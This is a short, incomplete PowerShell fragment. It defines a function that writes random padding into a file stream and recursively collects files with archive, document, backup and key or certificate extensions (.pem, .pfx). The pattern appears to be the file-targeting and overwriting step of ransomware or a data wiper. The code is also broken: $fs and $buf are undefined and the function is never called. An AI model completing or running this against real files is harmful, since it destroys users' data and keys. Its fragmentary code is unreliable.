function Write-RandomPadding($path){ $fs.Write($buf,0,32) }
$exts = @(".rar",".zip",".pem",".doc",".bak",".pfx")
Get-ChildItem -Recurse | Where-Object { $exts -contains $_.Extension }
